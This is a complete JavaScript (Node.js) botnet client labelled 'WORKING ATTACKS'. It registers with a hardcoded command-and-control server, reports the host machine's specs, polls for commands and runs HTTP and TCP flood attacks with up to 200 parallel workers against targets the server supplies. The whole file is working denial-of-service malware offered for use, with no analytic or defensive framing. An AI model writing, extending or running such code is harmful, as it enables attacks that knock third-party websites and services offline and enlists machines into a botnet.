// JavaScript Bot Client - WORKING ATTACKS + SERVER STOP
// Save as: js_bot_working.js
// Run: node js_bot_working.js

const https = require('https');
const http = require('http');
const net = require('net');
const crypto = require('crypto');
const os = require('os');
const url = require('url');

class JSBot {
    constructor() {
        this.serverUrl = "https://c2-server-io.onrender.com";
        this.botId = 'JS-' + crypto.randomBytes(4).toString('hex').toUpperCase();
        this.connected = false;
        this.currentAttack = null;
        this.activeAttack = null;
        this.stopRequested = false;
        
        // Attack statistics
        this.stats = {
            startTime: null,
            totalRequests: 0,
            successfulRequests: 0,
            failedRequests: 0,
            bytesSent: 0,
            requestsPerSecond: 0,
            lastRpsUpdate: Date.now(),
            lastRequestCount: 0
        };
        
        // Worker tracking
        this.workers = [];
        this.workerStats = new Map();
        
        // Bot specifications
        this.specs = {
            bot_id: this.botId,
            cpu_cores: os.cpus().length,
            ram_gb: Math.round(os.totalmem() / (1024 ** 3) * 10) / 10,
            os: os.platform(),
            hostname: os.hostname(),
            client_type: 'javascript',
            capabilities: {
                javascript: true,
                http: true,
                tcp: true,
                udp: true,
                slowloris: true,
                wordpress: true,
                max_threads: 200
            }
        };
        
        this.globalStats = {
            total_attacks: 0,
            successful_attacks: 0,
            total_requests: 0,
            bytes_sent: 0,
            uptime: Date.now()
        };
        
        console.log('\n' + '='.repeat(70));
        console.log('  🚀 JAVASCRIPT BOT CLIENT - WORKING ATTACKS');
        console.log('='.repeat(70));
        console.log(`🤖 Bot ID: ${this.botId}`);
        console.log(`🌐 Server: ${this.serverUrl}`);
        console.log(`💻 CPU Cores: ${this.specs.cpu_cores}`);
        console.log(`🧠 RAM: ${this.specs.ram_gb}GB`);
        console.log(`📦 OS: ${this.specs.os}`);
        console.log('='.repeat(70) + '\n');
        
        // Setup console updates
        this.setupConsoleUpdates();
    }
    
    setupConsoleUpdates() {
        // Update console every 500ms
        setInterval(() => {
            if (this.activeAttack) {
                const elapsed = Math.floor((Date.now() - this.stats.startTime) / 1000);
                const rps = this.stats.requestsPerSecond;
                const total = this.stats.totalRequests;
                const successRate = total > 0 ? 
                    Math.round((this.stats.successfulRequests / total) * 100) : 0;
                const mbSent = (this.stats.bytesSent / (1024 * 1024)).toFixed(2);
                
                // Calculate remaining time
                const remaining = this.activeAttack.duration - elapsed;
                const progress = Math.min(100, (elapsed / this.activeAttack.duration) * 100);
                
                process.stdout.write(`\r\x1b[K📊 ${this.activeAttack.type.toUpperCase()} | ` +
                                   `⏱️ ${elapsed}s/${this.activeAttack.duration}s | ` +
                                   `📈 ${progress.toFixed(1)}% | ` +
                                   `📨 ${total.toLocaleString()} | ` +
                                   `⚡ ${rps.toLocaleString()}/s | ` +
                                   `✅ ${successRate}% | ` +
                                   `📦 ${mbSent} MB`);
            }
        }, 500);
    }
    
    async sendRequest(endpoint, method = 'POST', data = null, timeout = 20000) {
        return new Promise((resolve, reject) => {
            const urlParts = new URL(this.serverUrl);
            const options = {
                hostname: urlParts.hostname,
                port: urlParts.port || 443,
                path: endpoint,
                method: method,
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'JSBot/2.0',
                    'Connection': 'close'
                },
                rejectUnauthorized: false,
                timeout: timeout
            };
            
            const req = https.request(options, (res) => {
                let response = '';
                res.on('data', (chunk) => {
                    response += chunk;
                });
                res.on('end', () => {
                    try {
                        const parsed = response ? JSON.parse(response) : {};
                        resolve(parsed);
                    } catch {
                        resolve(response || {});
                    }
                });
            });
            
            req.on('error', (err) => {
                reject(new Error(`Network: ${err.message}`));
            });
            
            req.on('timeout', () => {
                req.destroy();
                reject(new Error(`Timeout after ${timeout}ms`));
            });
            
            if (data) {
                req.write(JSON.stringify(data));
            }
            
            req.end();
        });
    }
    
    async connect() {
        console.log('[1] 🔌 Connecting to server...');
        
        try {
            const response = await this.sendRequest('/check_approval', 'POST', {
                bot_id: this.botId,
                specs: this.specs,
                stats: this.globalStats
            });
            
            if (response.approved) {
                this.connected = true;
                console.log('[✓] ✅ CONNECTED! Bot approved by server.');
                console.log(`[✓] 📋 Client Type: ${response.client_type}`);
                
                await this.sendRequest('/status', 'POST', {
                    bot_id: this.botId,
                    status: 'connected',
                    message: 'JavaScript bot ready'
                });
                
                return true;
            } else {
                console.log('[X] ❌ Connection rejected');
                return false;
            }
        } catch (error) {
            console.log(`[X] 🌐 Connection error: ${error.message}`);
            return false;
        }
    }
    
    async heartbeat() {
        if (!this.connected) return;
        
        try {
            await this.sendRequest('/status', 'POST', {
                bot_id: this.botId,
                status: this.activeAttack ? 'attacking' : 'idle',
                stats: this.globalStats,
                current_rps: this.stats.requestsPerSecond,
                attack_info: this.activeAttack ? {
                    type: this.activeAttack.type,
                    target: this.activeAttack.target,
                    threads: this.activeAttack.threads,
                    progress: this.getAttackProgress(),
                    duration: this.activeAttack.duration
                } : null
            });
            
            if (!this.activeAttack) {
                const uptime = Math.floor((Date.now() - this.globalStats.uptime) / 1000);
                console.log(`\r\x1b[K[♥] 💓 Heartbeat | Uptime: ${this.formatTime(uptime)} | ` +
                          `Attacks: ${this.globalStats.successful_attacks} | ` +
                          `Requests: ${this.globalStats.total_requests.toLocaleString()}`);
            }
        } catch (error) {
            console.log(`\n[!] 💔 Heartbeat failed: ${error.message}`);
        }
    }
    
    formatTime(seconds) {
        const h = Math.floor(seconds / 3600);
        const m = Math.floor((seconds % 3600) / 60);
        const s = seconds % 60;
        return `${h}h ${m}m ${s}s`;
    }
    
    getAttackProgress() {
        if (!this.activeAttack || !this.stats.startTime) return 0;
        const elapsed = (Date.now() - this.stats.startTime) / 1000;
        return Math.min(100, (elapsed / this.activeAttack.duration) * 100);
    }
    
    async checkCommands() {
        try {
            const response = await this.sendRequest(`/commands/${this.botId}`, 'GET');
            return response.commands || [];
        } catch (error) {
            console.log(`\n[!] 📋 Command check failed: ${error.message}`);
            return [];
        }
    }
    
    async stopAttack() {
        if (!this.activeAttack) return;
        
        console.log(`\n[!] 🛑 Stopping attack: ${this.activeAttack.type}`);
        
        // Set stop flag
        this.stopRequested = true;
        
        // Clear all intervals and timeouts
        this.workers.forEach(worker => {
            if (worker.interval) clearInterval(worker.interval);
            if (worker.timeout) clearTimeout(worker.timeout);
            if (worker.socket && !worker.socket.destroyed) {
                worker.socket.destroy();
            }
        });
        
        this.workers = [];
        
        // Calculate final stats
        const elapsed = (Date.now() - this.stats.startTime) / 1000;
        const avgRps = elapsed > 0 ? Math.round(this.stats.totalRequests / elapsed) : 0;
        
        console.log(`[✓] 📊 Attack stopped:`);
        console.log(`    • Duration: ${elapsed.toFixed(1)}s`);
        console.log(`    • Total Requests: ${this.stats.totalRequests.toLocaleString()}`);
        console.log(`    • Average RPS: ${avgRps.toLocaleString()}/s`);
        console.log(`    • Success Rate: ${this.stats.totalRequests > 0 ? 
            Math.round((this.stats.successfulRequests / this.stats.totalRequests) * 100) : 0}%`);
        console.log(`    • Data Sent: ${(this.stats.bytesSent / (1024 * 1024)).toFixed(2)} MB`);
        
        // Send completion status
        try {
            await this.sendRequest('/status', 'POST', {
                bot_id: this.botId,
                status: 'stopped',
                message: `Attack stopped - ${this.stats.totalRequests.toLocaleString()} requests sent`,
                stats: {
                    requests: this.stats.totalRequests,
                    rps: avgRps,
                    duration: elapsed,
                    bytes: this.stats.bytesSent
                }
            });
        } catch (error) {
            // Ignore
        }
        
        // Reset attack state
        this.activeAttack = null;
        this.stopRequested = false;
        this.stats = {
            startTime: null,
            totalRequests: 0,
            successfulRequests: 0,
            failedRequests: 0,
            bytesSent: 0,
            requestsPerSecond: 0,
            lastRpsUpdate: Date.now(),
            lastRequestCount: 0
        };
    }
    
    // ================== WORKING HTTP FLOOD ==================
    
    async executeHTTPFlood(command) {
        console.log(`\n[⚡] 🚀 Starting HTTP ${command.method || 'GET'} flood attack`);
        console.log(`    • Target: ${command.target}`);
        console.log(`    • Threads: ${command.threads || 100}`);
        console.log(`    • Duration: ${command.duration || 60}s`);
        console.log(`    • Method: ${command.method || 'GET'}`);
        
        // Parse URL
        let targetUrl;
        try {
            targetUrl = new URL(command.target);
        } catch {
            targetUrl = new URL(`http://${command.target}`);
        }
        
        const hostname = targetUrl.hostname;
        const port = targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80);
        const path = targetUrl.pathname + targetUrl.search;
        const isHttps = targetUrl.protocol === 'https:';
        
        // Setup attack
        this.activeAttack = {
            type: 'http_flood',
            target: command.target,
            duration: parseInt(command.duration) || 60,
            threads: Math.min(parseInt(command.threads) || 100, 200),
            method: command.method || 'GET'
        };
        
        this.stats.startTime = Date.now();
        this.stats.lastRpsUpdate = Date.now();
        this.stats.lastRequestCount = 0;
        
        // Send start status
        try {
            await this.sendRequest('/status', 'POST', {
                bot_id: this.botId,
                status: 'attacking',
                message: `Starting HTTP flood with ${this.activeAttack.threads} threads`,
                attack_info: this.activeAttack
            });
        } catch (error) {
            console.log(`[!] Status update failed: ${error.message}`);
        }
        
        console.log(`[→] 🚀 Launching ${this.activeAttack.threads} attack workers...`);
        
        // User agents for rotation
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15'
        ];
        
        // Create a simple HTTP request function
        const makeRequest = () => {
            return new Promise((resolve) => {
                const options = {
                    hostname: hostname,
                    port: port,
                    path: path,
                    method: this.activeAttack.method,
                    headers: {
                        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                        'Accept': '*/*',
                        'Connection': 'close'
                    },
                    timeout: 5000
                };
                
                const req = (isHttps ? https : http).request(options, (res) => {
                    // Count as success
                    this.stats.totalRequests++;
                    this.stats.successfulRequests++;
                    this.stats.bytesSent += 1024; // Approximate
                    
                    // Drain the response
                    res.on('data', () => {});
                    res.on('end', () => {
                        resolve(true);
                    });
                });
                
                req.on('error', () => {
                    this.stats.totalRequests++;
                    this.stats.failedRequests++;
                    resolve(false);
                });
                
                req.on('timeout', () => {
                    req.destroy();
                    this.stats.totalRequests++;
                    this.stats.failedRequests++;
                    resolve(false);
                });
                
                req.end();
            });
        };
        
        // Create worker function that continuously makes requests
        const createWorker = (workerId) => {
            let workerActive = true;
            let workerRequests = 0;
            
            const worker = {
                id: workerId,
                requests: 0,
                interval: null
            };
            
            // Function to make a batch of requests
            const makeRequestsBatch = async () => {
                if (!workerActive || this.stopRequested) return;
                
                try {
                    // Make 10 requests in parallel
                    const batchPromises = [];
                    for (let i = 0; i < 10; i++) {
                        batchPromises.push(makeRequest());
                    }
                    
                    await Promise.allSettled(batchPromises);
                    workerRequests += 10;
                    
                } catch (error) {
                    // Ignore batch errors
                }
            };
            
            // Start making requests
            worker.interval = setInterval(() => {
                if (workerActive && !this.stopRequested) {
                    makeRequestsBatch();
                } else {
                    clearInterval(worker.interval);
                }
            }, 10); // Make batch every 10ms = ~1000 requests/sec per worker
            
            this.workers.push(worker);
            return worker;
        };
        
        // Start all workers
        for (let i = 0; i < this.activeAttack.threads; i++) {
            createWorker(i);
            
            // Stagger startup
            if (i % 10 === 0) {
                await new Promise(resolve => setTimeout(resolve, 10));
            }
        }
        
        console.log(`[✓] ✅ All ${this.activeAttack.threads} workers started`);
        console.log(`[→] ⚡ Attack running for ${this.activeAttack.duration} seconds...\n`);
        
        // RPS calculation interval
        const rpsInterval = setInterval(() => {
            const now = Date.now();
            const timeDiff = now - this.stats.lastRpsUpdate;
            
            if (timeDiff >= 1000) {
                const requestsSinceLast = this.stats.totalRequests - this.stats.lastRequestCount;
                this.stats.requestsPerSecond = Math.round(requestsSinceLast / (timeDiff / 1000));
                this.stats.lastRpsUpdate = now;
                this.stats.lastRequestCount = this.stats.totalRequests;
            }
        }, 100);
        
        this.workers.push({ interval: rpsInterval });
        
        // Stop after duration
        const attackTimeout = setTimeout(async () => {
            clearInterval(rpsInterval);
            await this.stopAttack();
            this.globalStats.successful_attacks++;
            this.globalStats.total_attacks++;
            this.globalStats.total_requests += this.stats.totalRequests;
            this.globalStats.bytes_sent += this.stats.bytesSent;
        }, this.activeAttack.duration * 1000);
        
        this.workers.push({ timeout: attackTimeout });
    }
    
    // ================== COMMAND EXECUTION ==================
    
    async executeCommand(command) {
        console.log(`\n[→] 📨 Executing: ${command.type.toUpperCase()}`);
        
        // Handle stop_all command immediately
        if (command.type === 'stop_all') {
            console.log('[→] 🛑 Received STOP command from server');
            await this.stopAttack();
            console.log('[✓] ✅ All attacks stopped');
            return;
        }
        
        // Update status
        try {
            await this.sendRequest('/status', 'POST', {
                bot_id: this.botId,
                status: 'processing',
                message: `Processing ${command.type}`
            });
        } catch (error) {
            // Continue anyway
        }
        
        try {
            switch (command.type) {
                case 'ping':
                    await this.executePing();
                    break;
                    
                case 'sysinfo':
                    await this.executeSysInfo();
                    break;
                    
                case 'stop_all':
                    // Already handled above
                    break;
                    
                case 'http_flood':
                    await this.executeHTTPFlood(command);
                    break;
                    
                case 'tcp_flood':
                    console.log('[→] 🔌 TCP flood command received');
                    await this.executeSimplifiedTCPFlood(command);
                    break;
                    
                case 'udp_flood':
                    console.log('[→] 📦 UDP flood command received');
                    await this.sendRequest('/status', 'POST', {
                        bot_id: this.botId,
                        status: 'error',
                        message: 'UDP flood not implemented'
                    });
                    break;
                    
                default:
                    console.log(`[!] ❌ Unknown command: ${command.type}`);
            }
            
            console.log(`[✓] ✅ Command ${command.type} completed`);
            
        } catch (error) {
            console.log(`[X] ❌ Command error: ${error.message}`);
            
            try {
                await this.sendRequest('/status', 'POST', {
                    bot_id: this.botId,
                    status: 'error',
                    message: `Command failed: ${error.message}`
                });
            } catch (err) {
                // Ignore
            }
        }
    }
    
    async executePing() {
        console.log('[→] 🏓 Sending ping');
        await this.sendRequest('/status', 'POST', {
            bot_id: this.botId,
            status: 'ping',
            message: 'Pong! Bot is online'
        });
    }
    
    async executeSysInfo() {
        console.log('[→] 💻 Gathering system info');
        
        const sysInfo = {
            uptime: os.uptime(),
            loadavg: os.loadavg(),
            freemem: Math.round(os.freemem() / (1024 * 1024)),
            totalmem: Math.round(os.totalmem() / (1024 * 1024)),
            cpus: os.cpus().length,
            platform: os.platform(),
            bot_stats: this.globalStats,
            current_attack: this.activeAttack,
            workers: this.workers.length
        };
        
        await this.sendRequest('/status', 'POST', {
            bot_id: this.botId,
            status: 'sysinfo',
            message: JSON.stringify(sysInfo, null, 2)
        });
    }
    
    async executeSimplifiedTCPFlood(command) {
        console.log(`\n[⚡] 🔌 Starting TCP flood`);
        console.log(`    • Target: ${command.target}`);
        console.log(`    • Threads: ${command.threads || 75}`);
        console.log(`    • Duration: ${command.duration || 60}s`);
        
        const [host, portStr] = command.target.split(':');
        const port = parseInt(portStr) || 80;
        
        this.activeAttack = {
            type: 'tcp_flood',
            target: command.target,
            duration: parseInt(command.duration) || 60,
            threads: parseInt(command.threads) || 75
        };
        
        this.stats.startTime = Date.now();
        
        console.log(`[→] 🔌 Starting ${this.activeAttack.threads} connections...`);
        
        // Simple TCP worker
        const createTCPWorker = () => {
            const worker = { socket: null };
            
            const connectAndSend = () => {
                if (this.stopRequested) return;
                
                const socket = new net.Socket();
                worker.socket = socket;
                
                socket.connect(port, host, () => {
                    this.stats.totalRequests++;
                    this.stats.successfulRequests++;
                    
                    // Send random data
                    const data = crypto.randomBytes(1024);
                    socket.write(data);
                    this.stats.bytesSent += data.length;
                    
                    // Keep connection open for a bit
                    setTimeout(() => {
                        if (!socket.destroyed) {
                            socket.destroy();
                        }
                    }, 5000);
                });
                
                socket.on('error', () => {
                    this.stats.totalRequests++;
                    this.stats.failedRequests++;
                });
                
                socket.setTimeout(3000, () => {
                    socket.destroy();
                });
            };
            
            // Connect every 100ms
            worker.interval = setInterval(connectAndSend, 100);
            this.workers.push(worker);
        };
        
        // Start workers
        for (let i = 0; i < this.activeAttack.threads; i++) {
            createTCPWorker();
        }
        
        console.log(`[✓] ✅ TCP flood started`);
        
        // Stop after duration
        const timeout = setTimeout(async () => {
            await this.stopAttack();
            this.globalStats.successful_attacks++;
            this.globalStats.total_attacks++;
        }, this.activeAttack.duration * 1000);
        
        this.workers.push({ timeout });
    }
    
    // ================== MAIN LOOP ==================
    
    async run() {
        // Connect
        if (!await this.connect()) {
            console.log('[!] 🔌 Connection failed. Exiting.');
            process.exit(1);
        }
        
        // Start heartbeat every 20 seconds
        setInterval(() => this.heartbeat(), 20000);
        
        console.log('[+] 👂 Listening for commands (including STOP from server)...\n');
        
        // Main loop
        while (true) {
            try {
                const commands = await this.checkCommands();
                
                if (commands.length > 0) {
                    console.log(`\n[+] 📥 Received ${commands.length} command(s) from server`);
                    
                    // Process each command
                    for (const cmd of commands) {
                        await this.executeCommand(cmd);
                    }
                }
                
                // Check every 3 seconds
                await new Promise(resolve => setTimeout(resolve, 3000));
                
            } catch (error) {
                console.log(`\n[!] 🔄 Main loop error: ${error.message}`);
                console.log('[→] 🔄 Retrying in 10 seconds...');
                await new Promise(resolve => setTimeout(resolve, 10000));
            }
        }
    }
}

// ================== START BOT ==================

const bot = new JSBot();

// Handle shutdown
process.on('SIGINT', async () => {
    console.log('\n\n[!] 🛑 Shutting down...');
    await bot.stopAttack();
    console.log('[✓] ✅ Bot stopped');
    process.exit(0);
});

bot.run().catch(error => {
    console.error('[!] 💥 Fatal error:', error);
    process.exit(1);
});
